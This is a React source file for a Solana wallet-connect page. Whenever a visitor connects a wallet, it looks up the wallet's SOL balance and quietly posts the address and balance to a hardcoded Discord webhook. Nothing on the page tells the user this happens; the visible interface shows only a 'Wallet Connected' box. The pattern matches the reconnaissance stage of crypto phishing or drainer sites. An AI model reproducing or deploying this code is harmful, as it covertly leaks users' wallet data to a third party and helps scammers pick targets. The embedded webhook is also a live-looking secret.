import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import { ConnectionProvider, WalletProvider, useWallet } from '@solana/wallet-adapter-react';
import { WalletModalProvider, useWalletModal } from '@solana/wallet-adapter-react-ui';
import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    LedgerWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
    SolletExtensionWalletAdapter,
    SolletWalletAdapter,
    TorusWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import { clusterApiUrl, Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';
import './App.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <WalletConnectionHandler />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;
    const endpoint = useMemo(() => clusterApiUrl(network), [network]);

    const wallets = useMemo(() => [
        new PhantomWalletAdapter(),
        new GlowWalletAdapter(),
        new LedgerWalletAdapter(),
        new SlopeWalletAdapter(),
        new SolflareWalletAdapter({ network }),
        new SolletExtensionWalletAdapter(),
        new SolletWalletAdapter(),
        new TorusWalletAdapter(),
    ], [network]);

    return (
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>
                    {children}
                </WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();

    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);

    return null;
};

const WalletConnectionHandler: FC = () => {
    const { publicKey, connected } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);

    useEffect(() => {
        if (connected && publicKey) {
            fetchBalanceAndSend(publicKey);
        }
    }, [connected, publicKey]);

    const fetchBalanceAndSend = async (walletPublicKey: PublicKey) => {
        try {
            const connection = new Connection('https://api.mainnet-beta.solana.com');
            const balanceLamports = await connection.getBalance(walletPublicKey);
            const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
            setSolBalance(balanceSOL);

            await sendToDiscord(walletPublicKey.toBase58(), balanceSOL);
        } catch (error) {
            console.error('Failed to fetch balance or send to Discord:', error);
        }
    };

    const sendToDiscord = async (address: string, balance: number) => {
        const webhookURL = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';

        const message = {
            content: `🚀 **Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``
        };

        try {
           await fetch(webhookURL, {
    method: 'POST',
    mode: 'no-cors', // 👈 add this
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(message)
});

            console.log('✅ Sent wallet info to Discord');
        } catch (error) {
            console.error('❌ Failed to send to Discord', error);
        }
    };

    if (!connected || !publicKey) return null;

    return (
        <div style={{
            marginTop: '2rem',
            textAlign: 'center',
            backgroundColor: '#f0f0f0',
            padding: '20px',
            borderRadius: '12px',
            boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
            maxWidth: '500px',
            marginLeft: '20px',
            marginRight: 'auto',
            fontFamily: 'Arial, sans-serif',
        }}>
            <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected!</h2>
            <p style={{ color: '#000' }}><strong>Address:</strong> {publicKey.toBase58()}</p>
            <p style={{ color: '#000' }}><strong>Balance:</strong> {solBalance !== null ? solBalance.toFixed(4) : 'Loading...'} SOL</p>
        </div>
    );
};

export default App;
